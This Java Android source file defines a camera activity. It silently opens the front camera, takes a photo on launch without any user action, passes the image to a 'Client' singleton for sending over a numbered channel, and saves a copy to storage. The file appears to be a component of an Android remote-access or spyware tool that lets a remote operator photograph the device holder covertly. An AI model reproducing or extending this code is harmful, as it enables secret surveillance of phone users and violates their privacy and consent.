package my.app.Library;  
  
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

import my.app.client.Client;
import my.app.client.R;
import android.app.Activity;
import android.content.Intent;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
  
public class CameraActivity extends Activity implements SurfaceHolder.Callback  
{  
    protected static final int MEDIA_TYPE_IMAGE = 1;
	private static final int MEDIA_TYPE_VIDEO = 0;
	//a variable to store a reference to the Image View at the main.xml file  
    //a variable to store a reference to the Surface View at the main.xml file  
    private SurfaceView sv;  
    //Camera variables  
    //a surface holder  
    private SurfaceHolder sHolder;  
    //a variable to control the camera  
    private Camera mCamera;  
    //the camera parameters  
    private Parameters parameters;  
   int chan;
	 /** Called when the activity is first created. */  
    @Override  
    public void onCreate(Bundle savedInstanceState)  
    {  
    	Log.i("CameraActivity", "Creating new Activity");
        super.onCreate(savedInstanceState);  
        setContentView(R.layout.picture);  
  
        Intent intent = getIntent();
        chan=intent.getExtras().getInt("chan");
      
        sv = (SurfaceView) findViewById(R.id.surface);  
        //Get a surface  
        sHolder = sv.getHolder();  
        sHolder.addCallback(this);  
        //tells Android that this surface will have its data constantly replaced  
        sHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);  
    }  
  

    public void surfaceChanged(SurfaceHolder arg0, int arg1, int arg2, int arg3)  
    {  
         //get camera parameters  
         parameters = mCamera.getParameters();  
  
         //set camera parameters  
         mCamera.setParameters(parameters);  
         mCamera.startPreview();  
  
         //sets what code should be executed after the picture is taken  
         Camera.PictureCallback mCall = new Camera.PictureCallback()  
         {  
 
             public void onPictureTaken(byte[] data, Camera camera)  
             {                   
                 //sending picture
                 Client.getInstace().handleData(chan,data);
	    	     Log.i("CameraActivity", "Picture sent!");
	    	     
	    	     //saving picture to disk
	    	     File pictureFile = getOutputMediaFile(MEDIA_TYPE_IMAGE);
                 if (pictureFile == null){
                     Log.d("CameraActivity", "Error creating media file, check storage permissions: ");
                  
                     return;
                 }
                 try {
                     FileOutputStream fos = new FileOutputStream(pictureFile);
                     fos.write(data);
                     fos.close();
                 } catch (FileNotFoundException e) {
                     Log.d("CAmeraActivity", "File not found: " + e.getMessage());
                 } catch (IOException e) {
                     Log.d("CAeraActivity", "Error accessing file: " + e.getMessage());
                 }
               //  moveTaskToBack(true);
                 finish();
             }  
         };  
  
         mCamera.takePicture(null, null, mCall);  
    }  
  

    public void surfaceCreated(SurfaceHolder holder)  
    {  
        // The Surface has been created, acquire the camera and tell it where  
        // to draw the preview.  
    	
    	int cameraId = 1;
        mCamera = Camera.open(cameraId);  
        try {  
           mCamera.setPreviewDisplay(holder);  
  
        } catch (IOException exception) {  
            mCamera.release();  
            mCamera = null;  
        }  
    }  
  

    public void surfaceDestroyed(SurfaceHolder holder)  
    {  
        //stop the preview  
        mCamera.stopPreview();  
        //release the camera  
        mCamera.release();  
        //unbind the camera from this object  
        mCamera = null;  
    }  
    
    private static File getOutputMediaFile(int type){
        // To be safe, you should check that the SDCard is mounted
        // using Environment.getExternalStorageState() before doing this.

        File mediaStorageDir = new File(Environment.getExternalStoragePublicDirectory(
                  Environment.DIRECTORY_PICTURES), "MyCameraApp");
        // This location works best if you want the created images to be shared
        // between applications and persist after your app has been uninstalled.

        // Create the storage directory if it does not exist
        if (! mediaStorageDir.exists()){
            if (! mediaStorageDir.mkdirs()){
                Log.d("MyCameraApp", "failed to create directory");
                return null;
            }
        }

        // Create a media file name
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        File mediaFile;
        if (type == MEDIA_TYPE_IMAGE){
            mediaFile = new File(mediaStorageDir.getPath() + File.separator +
            "IMG_"+ timeStamp + ".jpg");
            Log.i("CAmeraActivity","Picture saved: " + mediaStorageDir.getPath() + File.separator +
                    "IMG_"+ timeStamp + ".jpg");
        } else if(type == MEDIA_TYPE_VIDEO) {
            mediaFile = new File(mediaStorageDir.getPath() + File.separator +
            "VID_"+ timeStamp + ".mp4");
        } else {
            return null;
        }

        return mediaFile;
    }
} 